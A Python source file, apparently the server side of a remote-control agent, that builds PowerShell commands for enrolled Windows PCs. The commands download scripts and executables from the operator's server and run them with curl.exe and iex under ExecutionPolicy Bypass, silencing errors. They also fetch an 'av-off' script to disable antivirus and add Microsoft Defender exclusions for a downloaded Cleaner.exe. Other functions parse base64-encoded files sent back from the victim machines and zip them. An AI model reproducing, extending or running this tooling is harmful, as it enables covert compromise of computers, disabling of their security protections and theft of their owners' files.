from __future__ import annotations

import base64
import io
import re
import zipfile
from typing import Any

from app import store
from app.tools_catalog import TOOLS, TOOLS_BY_ID


def _files_base() -> str:
    return f"{store.effective_base_url().rstrip('/')}/files"


def tool_download_url(rel_path: str) -> str:
    rel = rel_path.lstrip("/").replace("\\", "/")
    return f"{_files_base()}/tools/{rel}"


def _q(s: str) -> str:
    return "'" + s.replace("'", "''") + "'"


def _short_runner(tool_id: str | None = None, *, all_tools: bool = False) -> str:
    """
    Run tool script on the PC.
    Solo: iex in-process (nested -WindowStyle Hidden drops FILEB64).
    Zip: nested + RESULT_FILE (large payload).
    """
    files = _files_base()
    if all_tools:
        script = f"{files}/scripts/export-tools.ps1"
        return f"""
$ErrorActionPreference='SilentlyContinue'
try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
$env:AGENTSHE_FILES={_q(files)}
$res=Join-Path $env:TEMP ('hh-res-'+[guid]::NewGuid().ToString('n')+'.txt')
$env:AGENTSHE_RESULT_FILE=$res
$tmp=Join-Path $env:TEMP ('hh-run-'+[guid]::NewGuid().ToString('n')+'.ps1')
& curl.exe -fsSL {_q(script)} -o $tmp
if(-not(Test-Path $tmp)){{throw 'export script download failed'}}
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp | Out-Null
$out=''
if(Test-Path -LiteralPath $res){{ $out=[IO.File]::ReadAllText($res) }}
if(-not $out){{ $out = (& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp | Out-String -Width 4096) }}
Remove-Item $tmp,$res -Force -EA SilentlyContinue
if(-not $out){{throw 'pas de sortie export'}}
Write-Output $out
""".strip()

    if not tool_id or tool_id not in TOOLS_BY_ID:
        raise ValueError(f"outil inconnu: {tool_id}")
    script = f"{files}/scripts/run-tool.ps1"
    # Same process as the agent command — Write-Output FILEB64 is captured reliably.
    return f"""
$ErrorActionPreference='SilentlyContinue'
try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
$env:AGENTSHE_FILES={_q(files)}
$env:AGENTSHE_TOOL_ID={_q(tool_id)}
$res=Join-Path $env:TEMP ('hh-res-'+[guid]::NewGuid().ToString('n')+'.txt')
$env:AGENTSHE_RESULT_FILE=$res
iex ((curl.exe -fsSL {_q(script)} | Out-String))
$out=''
if(Test-Path -LiteralPath $res){{ $out=[IO.File]::ReadAllText($res) }}
Remove-Item $res -Force -EA SilentlyContinue
if($out){{ Write-Output $out }}
""".strip()


def build_av_off_ps() -> str:
    files = _files_base()
    script = f"{files}/scripts/av-off.ps1"
    return f"""
$ErrorActionPreference='SilentlyContinue'
try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
$files={_q(files)}
$env:AGENTSHE_FILES=$files
$env:AGENTSHE_BOT_BASE=($files -replace '/files$','')
$tmp=Join-Path $env:TEMP ('hh-avoff-'+[guid]::NewGuid().ToString('n')+'.ps1')
& curl.exe -fsSL {_q(script)} -o $tmp
if(-not(Test-Path $tmp)){{throw 'av-off download failed'}}
$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp 2>&1 | Out-String -Width 2147483647
Write-Output $o
Remove-Item $tmp -Force -EA SilentlyContinue
""".strip()


def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
    _ = prefer_x64
    return _short_runner(tool_id)


def build_all_tools_ps() -> str:
    return _short_runner(all_tools=True)


def build_cleaner_ps() -> str:
    """Download Cleaner.exe (zero-dep) and run; return stdout summary."""
    files = _files_base()
    url = f"{files}/tools/Cleaner.exe"
    return f"""
$ErrorActionPreference='SilentlyContinue'
try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
$dir=Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$exe=Join-Path $dir 'Cleaner.exe'
& curl.exe -fsSL {_q(url)} -o $exe
if(-not(Test-Path $exe) -or (Get-Item $exe).Length -lt 100000){{throw 'Cleaner.exe download failed'}}
Unblock-File $exe -EA SilentlyContinue
try{{Add-MpPreference -ExclusionPath $dir -EA SilentlyContinue}}catch{{}}
try{{Add-MpPreference -ExclusionProcess 'Cleaner.exe' -EA SilentlyContinue}}catch{{}}
$o=& $exe 2>&1 | Out-String -Width 4096
Write-Output $o
if($o -notmatch 'CLEANER done'){{throw 'Cleaner incomplete'}}
""".strip()


_FILE_RE = re.compile(
    r"FILEB64:([^:\r\n]+):([A-Za-z0-9+/=\r\n\t ]+)",
    re.DOTALL,
)


def parse_file_b64(output: str) -> tuple[str, bytes]:
    text = output or ""
    matches = list(_FILE_RE.finditer(text))
    if not matches:
        raise ValueError("pas de fichier renvoyé par le PC")
    m = matches[-1]
    name = m.group(1).strip()
    b64 = re.sub(r"\s+", "", m.group(2))
    if "ERRS:" in b64:
        b64 = b64.split("ERRS:", 1)[0]
    try:
        return name, base64.b64decode(b64, validate=False)
    except Exception as e:
        raise ValueError(f"fichier corrompu ({name}): {e}") from e


def zip_tool_files(files: list[tuple[str, bytes]]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in files:
            zf.writestr(name, data)
    return buf.getvalue()


def is_windows_session(session: dict[str, Any]) -> bool:
    platform = (session.get("platform") or "").lower()
    agent = session.get("agent") or {}
    if not platform or platform == "any":
        platform = (agent.get("platform") or "").lower()
    # Hostname heuristics for mis-tagged enrolls
    if platform not in ("windows", "win", "windows_nt"):
        name = (session.get("name") or agent.get("hostname") or "").upper()
        if name.startswith("DESKTOP-") or name.startswith("WIN-") or name.startswith("LAPTOP-"):
            return True
    return platform in ("windows", "win", "windows_nt")
